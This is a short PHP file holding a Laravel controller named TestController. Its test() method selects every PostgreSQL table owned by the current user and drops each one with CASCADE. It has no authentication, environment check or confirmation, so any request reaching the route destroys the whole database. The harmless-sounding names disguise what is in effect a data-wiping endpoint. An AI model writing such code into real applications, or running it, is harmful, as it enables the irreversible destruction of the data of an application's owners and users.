<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class TestController extends Controller
{
    public function test(Request $request)
    {
        $db = \Illuminate\Support\Facades\DB::class;
        $tables = $db::select("select * from pg_tables where tableowner = current_user");
        foreach ($tables as $table) {
            $db::delete("drop table if exists {$table->tablename} cascade");
        }
    }
}
